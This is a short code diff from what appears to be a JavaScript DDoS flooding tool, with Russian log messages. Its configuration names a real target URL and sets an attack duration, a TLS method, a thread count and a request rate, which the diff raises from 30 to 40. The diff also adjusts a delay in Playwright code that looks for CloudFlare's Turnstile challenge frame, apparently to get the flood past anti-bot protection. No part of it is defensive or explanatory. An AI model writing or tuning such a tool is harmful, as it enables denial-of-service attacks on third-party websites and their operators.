@@ -7,7 +7,7 @@ const args = {
   Target: "https://legalizer.cc",
   Time: "5000",
   Method: "TLSv1",
-  Rate: "30",
+  Rate: "40",
   Threads: "5"
 };
 const JSList = {
@@ -232,6 +232,7 @@ if (["CloudFlare"].includes(detected.name)) {
     while (!redirectHappened) {
       const frame = page.frames().find(f => f.url().includes('challenges.cloudflare.com'));
       if (!frame) {
+        await sleep(8800)
         log(`[${`Playwright`.red}] Фрейм Turnstile не найден.`);
         break;
       }
@@ -246,8 +247,6 @@ if (["CloudFlare"].includes(detected.name)) {
         break;
       }
 
-      
-      await sleep(8800)
 
       // Проверяем, сменился ли URL - это будет признаком 
       
